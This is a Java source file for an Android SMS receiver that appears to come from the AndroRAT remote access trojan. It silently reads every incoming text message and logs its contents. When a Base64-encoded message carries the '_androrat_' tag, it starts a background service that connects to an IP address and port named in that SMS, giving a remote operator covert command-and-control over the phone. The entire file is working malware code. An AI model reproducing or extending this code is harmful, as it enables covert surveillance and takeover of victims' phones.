package my.app.client;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import java.util.Arrays;
import java.util.List;

public class SmsListener extends BroadcastReceiver {


    Intent Client, ClientAlt;
    Context cntx;
    @Override
    public void onReceive(Context context, Intent intent) {

        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                String messageBody = smsMessage.getMessageBody();
//                Toast.makeText(context,messageBody, Toast.LENGTH_LONG).show();
                Log.i("TAG", messageBody);
                this.checkSMS(messageBody,context);
            }
        }
    }
    public void checkSMS(String message,Context context){
        try {
            String decodedString = new String(Base64.decode(message,Base64.DEFAULT));
            List<String> msg = Arrays.asList(decodedString.split(","));
            if(msg.get(0).equals("_androrat_")){
                Log.i("insiders", message);
                cntx = context;
                switch (msg.get(1)){
                    case "connect":
                        this.connect(msg);
                        break;
                    case "disconnect":
                        this.disconnect();
                        break;
                    default:
                        throw new Exception("");
                }
            }else{
                throw new Exception("");
            }
        }catch (Exception ignored){
            Log.i("outsiders", message);
        }
    }
    public void connect(List<String> msg) throws Exception{

        Log.i("SMS COMMAND", "CONNECT");
        String ip = msg.get(2);
        int port = Integer.parseInt(msg.get(3));
        Log.i("ip", ip);
        Log.i("port", String.valueOf(port));

        Client = new Intent(cntx, Client.class);
        Client.setAction(LauncherActivity.class.getName());
        Client.putExtra("IP", ip);
        Client.putExtra("PORT", port);
        cntx.startService(Client);
    }
    public void disconnect() throws Exception{
        cntx.stopService(Client);
    }
}